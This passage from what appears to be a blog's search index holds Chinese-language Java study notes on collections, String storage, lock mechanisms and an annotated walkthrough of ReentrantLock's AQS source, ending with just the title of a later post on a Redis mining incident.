title="TreeMap"></a>TreeMap</h3><ol><li>自平衡二叉树，平衡二叉树是指：根节点的左子节点与右子树的高度相差不会超过1层，当超过时，会进行自旋翻转</li><li>迭代器采用中序遍历</li><li>无序，不可重复，可排序（这里需要注意如果key为自定义类型，需要实现<code>java.lang.Comparable</code>接口，重写compareTo方法，或者在TreeMap构造器中重新compare方法）<ol><li>当我们规则固定时，建议使用实现<code>java.lang.Comparable</code>接口。</li><li>当当我们规则需要修改时，使用Comparator接口</li></ol></li></ol><h2 id="Collection工具类"><a href="#Collection工具类" class="headerlink" title="Collection工具类"></a>Collection工具类</h2><ol><li><code>Collections.sort(List list)</code></li><li><code>Collections.sort(List list, Compataor cmp)</code></li></ol><h2 id="String存储原理"><a href="#String存储原理" class="headerlink" title="String存储原理"></a>String存储原理</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//这里是直接创建在方法区的字符串常量池</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">       <span class="comment">//这个是在堆中创建了一个String对象，但值是指向方法区的</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">       <span class="comment">//判断这个字符串在常量池是否存在，如果存在直接返回，如果不存在创建返回</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> s1.intern();</span><br><span class="line"></span><br><span class="line">       System.out.println(s == s1);   <span class="comment">//false</span></span><br><span class="line">       System.out.println(s1 == s2);  <span class="comment">//false</span></span><br><span class="line">       System.out.println(s == s2);   <span class="comment">//true</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="String-StringBuilder-StringBuffer"><a href="#String-StringBuilder-StringBuffer" class="headerlink" title="String,StringBuilder,StringBuffer"></a>String,StringBuilder,StringBuffer</h4><ol><li>String被final修饰，当你修改时是直接创建一个新的在方法区，所以当我们使用时，如果该值经常就修改，最好使用后面两个</li><li>StringBuilder没有final修饰，可变，线程不安全，效率高</li><li>StringBuffer没有final修饰，可变，线程安全，效率低</li></ol><h2 id="锁问题"><a href="#锁问题" class="headerlink" title="锁问题"></a>锁问题</h2><h3 id="Synchronize（重量级锁）"><a href="#Synchronize（重量级锁）" class="headerlink" title="Synchronize（重量级锁）"></a>Synchronize（重量级锁）</h3><blockquote><p>加在方法上，对方法进行同步，也就是每次只能一个线程进入。默认为非公平锁</p></blockquote><ol><li>优点：简单，直接，自动完成加锁，解锁操作</li><li>缺点：在用户态和内核态进行切换，效率低。</li></ol><h3 id="ReenLock（手动锁）"><a href="#ReenLock（手动锁）" class="headerlink" title="ReenLock（手动锁）"></a>ReenLock（手动锁）</h3><blockquote><p>通过创建锁对象，手动的进行加锁，和解锁</p></blockquote><ol><li>优点：可以自己设置为公平或非公平锁</li></ol><blockquote><p>非公平锁：假如有三个线程同时来，那最终哪个线程能够进入就看谁快，（不用排队）</p><p>公平锁：三个线程进入，依次放入一个队列，（先到先得）</p></blockquote><ol start="2"><li>缺点：需要自己注意解锁的过程，锁是可重入的，如果少释放一层就会出现死锁现象</li></ol><h3 id="CAS（Compare-And-Set：轻量级锁，乐观锁）"><a href="#CAS（Compare-And-Set：轻量级锁，乐观锁）" class="headerlink" title="CAS（Compare And Set：轻量级锁，乐观锁）"></a>CAS（Compare And Set：轻量级锁，乐观锁）</h3><blockquote><p>通过<code>AtomicReference</code>进行创建自旋锁，每次线程操作前会检查自旋锁的值是否是预想值，如果不是需要进行自旋操作，知道当前值与预期值一致时，才可以操作。</p></blockquote><ol><li>优点：不会进入内核态，减少切换的性能消耗</li><li>缺点：自旋其实就是循环，如果一个线程一直无法进行操作，就会导致CPU空转，也会带来性能消耗</li></ol><blockquote><p>CAS的经典问题：ABA问题 -&gt; 就是说我预期值为1，但是别的线程先改成2了，再一个线程又改成1了，那当我判断时并不知道这个值之前已经被人操作了，我会继续执行我自己的逻辑。那么该如何解决呢？</p></blockquote><p>使用<code>AtomicStampedReference</code>加上时间戳，通俗的说就是加上一个版本号，不仅要比较当前值，还要比较版本号。只有两者都相等，才执行更新操作。</p><blockquote><p>如果优化CAS?</p></blockquote><p>​    可在线程空转一定时间后，放入阻塞队列中等待。</p><h3 id="LockSupport"><a href="#LockSupport" class="headerlink" title="LockSupport"></a>LockSupport</h3><ol><li>是什么<ol><li>对阻塞，唤醒的优化机制</li><li>其实底层使用的是一个permit许可证，取值范围0-1</li></ol></li><li>能干嘛<ol><li>线程同步操作</li></ol></li><li>去哪下<ol><li>JUC包</li></ol></li><li>怎么玩<ol><li>LockSupport.port相当于需要消耗一个许可证，如果许可证=1，则直接-1返回，不会阻塞，</li><li>LockSupport.unport相当于给出一个许可证，但是许可证上限是1，重复使用unport许可证还是等于1，所以执行两次LockSupport.unport 和 LockSupport.port，会导致最后一个port阻塞</li></ol></li><li>AB法则<ol><li>Object.wait() 和 Object.notify() 有哪些不足<ol><li>wait 和 notify 必须在同步代码块中出现.</li><li>无法先notify，再wait，会导致死锁问题</li></ol></li><li>Lock.Condition.await()  和 signal() 有哪些不足<ol><li>与wait,notify的问题一致</li></ol></li><li>所以我们推出了LockSupport，看是如果解决上述方法了。</li></ol></li></ol><h3 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h3><p>我们通过对ReentrantLock的源码解读来学习</p><blockquote><p>创建锁</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个Reentrant锁</span></span><br><span class="line"><span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"><span class="comment">// 通过构造器我们可以看到实际上创建的是一个Sync对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ReentrantLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Sync</span> <span class="variable">sync</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NonfairSync</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// Sync类是继承了AQS（抽象队列同步器）</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Sync</span> <span class="keyword">extends</span> <span class="title class_">AbstractQueuedSynchronizer</span></span><br></pre></td></tr></table></figure><blockquote><p>获取锁</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 底层还是sync对象调用lock方法</span></span><br><span class="line">lock.lock();  -&gt;  sync.lock();</span><br><span class="line"><span class="comment">// lock方法是Sync的抽象模板方法，具体由NonfairSync进行实现，这里我们使用默认的非公平锁</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 尝试获取锁</span></span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                <span class="comment">// 如果获取成功则，将当前线程设为所有者线程</span></span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 如果没获取到，则再判断</span></span><br><span class="line">                acquire(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">acquire</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">  <span class="comment">// 调用nonfairTryAcquire(int acquires) 再次尝试获取锁，判断是否为可重入</span></span><br><span class="line">        <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">            <span class="comment">// 先将当前线程创建成一个节点，加入等待队列中，再进行最后的尝试</span></span><br><span class="line">            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">            selfInterrupt();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">nonfairTryAcquire</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">    <span class="comment">// 当前线程</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Thread</span> <span class="variable">current</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">    <span class="comment">// 这里使用AQS方法，获取锁值，</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState();</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果为0说明可以抢占锁了</span></span><br><span class="line">        <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断之前抢到锁的线程是否就是自己，保证锁的可重入性</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">        <span class="comment">// 如果是，则计数器+1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nextc</span> <span class="operator">=</span> c + acquires;</span><br><span class="line">        <span class="comment">// 这里怕计数器溢出了</span></span><br><span class="line">        <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class="line">        setState(nextc);</span><br><span class="line">        <span class="comment">// 判断抢锁成功</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// 抢锁失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Node <span class="title function_">addWaiter</span><span class="params">(Node mode)</span> &#123;</span><br><span class="line"><span class="comment">// 添加一个等待节点，并标记为渎职EXCLUSIVE独占模式</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(Thread.currentThread(), mode);</span><br><span class="line">    <span class="comment">// Try the fast path of enq; backup to full enq on failure</span></span><br><span class="line">    <span class="comment">// 获取队列中的尾结点</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">pred</span> <span class="operator">=</span> tail;</span><br><span class="line">    <span class="keyword">if</span> (pred != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 尾结点不为空，说明前面还有等待的节点，则进行串联</span></span><br><span class="line">        node.prev = pred;</span><br><span class="line">        <span class="keyword">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class="line">            pred.next = node;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果队列为空，则插入当前节点到队列中</span></span><br><span class="line">    enq(node);</span><br><span class="line">    <span class="comment">// 最后返回生成的节点</span></span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Node <span class="title function_">enq</span><span class="params">(<span class="keyword">final</span> Node node)</span> &#123;</span><br><span class="line">        <span class="comment">// 这是一个自旋结构</span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">// 再次判断队列是否为空</span></span><br><span class="line">            <span class="type">Node</span> <span class="variable">t</span> <span class="operator">=</span> tail;</span><br><span class="line">            <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123; <span class="comment">// Must initialize</span></span><br><span class="line">                <span class="comment">// 将该节点加入队列，这里注意头结点和尾结点是一个系统自建的一个节点，也是一个面试可能考的点，第一个进入等待队列的节点，其头指针指向的是哨兵节点</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndSetHead(<span class="keyword">new</span> <span class="title class_">Node</span>()))</span><br><span class="line">                    tail = head;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 新来的节点连接尾结点或哨兵节点</span></span><br><span class="line">                node.prev = t;</span><br><span class="line">                <span class="comment">// 将尾指针设置为新加入的节点</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class="line">                    t.next = node;</span><br><span class="line">                    <span class="keyword">return</span> t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>开始准备将节点进行阻塞</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">acquireQueued</span><span class="params">(<span class="keyword">final</span> Node node, <span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">failed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">interrupted</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="comment">// 自旋结构</span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">           <span class="comment">// 获取当前封装节点的前一个节点</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> node.predecessor();</span><br><span class="line">            <span class="comment">// 如果p就是头结点，也就是哨兵节点，则再尝试去获取锁</span></span><br><span class="line">            <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                <span class="comment">// 如果获取成功了，将当前线程节点设置为头结点</span></span><br><span class="line">                setHead(node);</span><br><span class="line">                <span class="comment">// 将之前的头结点进行垃圾回收，这里其实就是头结点的替换</span></span><br><span class="line">                p.next = <span class="literal">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                failed = <span class="literal">false</span>;</span><br><span class="line">                <span class="comment">// 返回线程是否被打断过</span></span><br><span class="line">                <span class="keyword">return</span> interrupted;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Park相当于wait进行阻塞</span></span><br><span class="line">            <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                parkAndCheckInterrupt())</span><br><span class="line">                interrupted = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (failed)</span><br><span class="line">            <span class="comment">// 取消排队</span></span><br><span class="line">            cancelAcquire(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">shouldParkAfterFailedAcquire</span><span class="params">(Node pred, Node node)</span> &#123; </span><br><span class="line">        <span class="comment">// 获取前一个节点可能是哨兵节点的状态值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ws</span> <span class="operator">=</span> pred.waitStatus;</span><br><span class="line">        <span class="comment">// 如果status值=-1</span></span><br><span class="line">        <span class="keyword">if</span> (ws == Node.SIGNAL)</span><br><span class="line">            <span class="comment">// 说明这个节点已经尝试过一次（因为调用结构为自旋），但是失败了</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (ws &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Predecessor was cancelled. Skip over predecessors and</span></span><br><span class="line"><span class="comment">             * indicate retry.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                node.prev = pred = pred.prev;</span><br><span class="line">            &#125; <span class="keyword">while</span> (pred.waitStatus &gt; <span class="number">0</span>);</span><br><span class="line">            pred.next = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 这里如果是第一次来，则将前节点状态值设置为-1</span></span><br><span class="line">            compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">parkAndCheckInterrupt</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 当前节点直接被挂起，相当于阻塞，也就是不再去抢锁了</span></span><br><span class="line">        LockSupport.park(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> Thread.interrupted();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>解锁</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">lock.unlock();  -&gt;   sync.release(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">release</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试解锁</span></span><br><span class="line">        <span class="keyword">if</span> (tryRelease(arg)) &#123;</span><br><span class="line">            <span class="comment">// 当前节点解锁成功后，再看AQS头结点</span></span><br><span class="line">            <span class="type">Node</span> <span class="variable">h</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="comment">// 如果头结点不为空，且只要status!=0,说明队列中肯定有阻塞的节点</span></span><br><span class="line">            <span class="keyword">if</span> (h != <span class="literal">null</span> &amp;&amp; h.waitStatus != <span class="number">0</span>)</span><br><span class="line">                unparkSuccessor(h);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryRelease</span><span class="params">(<span class="type">int</span> releases)</span> &#123;</span><br><span class="line">            <span class="comment">// 将当前线程节点状态-1，</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState() - releases;</span><br><span class="line">            <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalMonitorStateException</span>();</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">free</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// c=0表示已经锁解除干净了，没有重入了</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">                free = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// 将占锁标记指向null，其他线程看到了。就可以直接去抢占了</span></span><br><span class="line">                setExclusiveOwnerThread(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置这个线程的状态值</span></span><br><span class="line">            setState(c);</span><br><span class="line">            <span class="comment">// 返回解锁成功</span></span><br><span class="line">            <span class="keyword">return</span> free;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unparkSuccessor</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If status is negative (i.e., possibly needing signal) try</span></span><br><span class="line"><span class="comment">         * to clear in anticipation of signalling.  It is OK if this</span></span><br><span class="line"><span class="comment">         * fails or if status is changed by waiting thread.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="comment">// 注意这个的node是AQS的头结点，判断status值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ws</span> <span class="operator">=</span> node.waitStatus;</span><br><span class="line">        <span class="keyword">if</span> (ws &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 将头结点的值设置为0</span></span><br><span class="line">            compareAndSetWaitStatus(node, ws, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Thread to unpark is held in successor, which is normally</span></span><br><span class="line"><span class="comment">         * just the next node.  But if cancelled or apparently null,</span></span><br><span class="line"><span class="comment">         * traverse backwards from tail to find the actual</span></span><br><span class="line"><span class="comment">         * non-cancelled successor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 获取到哨兵节点后第一个阻塞节点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">s</span> <span class="operator">=</span> node.next;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s.waitStatus &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            s = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">t</span> <span class="operator">=</span> tail; t != <span class="literal">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class="line">                <span class="keyword">if</span> (t.waitStatus &lt;= <span class="number">0</span>)</span><br><span class="line">                    s = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s != <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">// 这里我们可以看到被阻塞的线程被唤醒了</span></span><br><span class="line">            LockSupport.unpark(s.thread);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
            <tag> 锁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis挖矿分析</title>
      <link href="/2022/11/25/Redis/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BD%93%E4%BD%A0%E5%AD%A6%E4%B9%A0Redis%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E6%8C%96%E7%9F%BF%E4%BA%86/"/>
      <url>/2022/11/25/Redis/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BD%93%E4%BD%A0%E5%AD%A6%E4%B9%A0Redis%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E6%8C%96%E7%9F%BF%E4%BA%86/</url>
      
